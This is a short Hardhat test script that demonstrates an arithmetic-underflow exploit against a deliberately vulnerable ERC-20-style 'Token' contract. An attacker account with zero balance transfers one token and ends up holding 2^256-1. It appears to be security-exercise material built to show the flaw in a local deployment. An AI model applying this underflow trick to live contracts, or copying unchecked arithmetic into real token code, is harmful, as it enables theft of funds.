const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("ATTACK | Token (underflow) - VULNERABLE contract only", function () {
  it("account with 0 tokens ends up with 2^256-1 tokens", async function () {
    const [owner, attacker] = await ethers.getSigners();
    const token = await (await ethers.getContractFactory("Token")).deploy(20);
    console.log("      before:", (await token.balanceOf(attacker.address)).toString());
    await token.connect(attacker).transfer(owner.address, 1); // 0 - 1 wraps
    console.log("      after :", (await token.balanceOf(attacker.address)).toString());
    expect(await token.balanceOf(attacker.address)).to.equal(ethers.MaxUint256);
  });
});
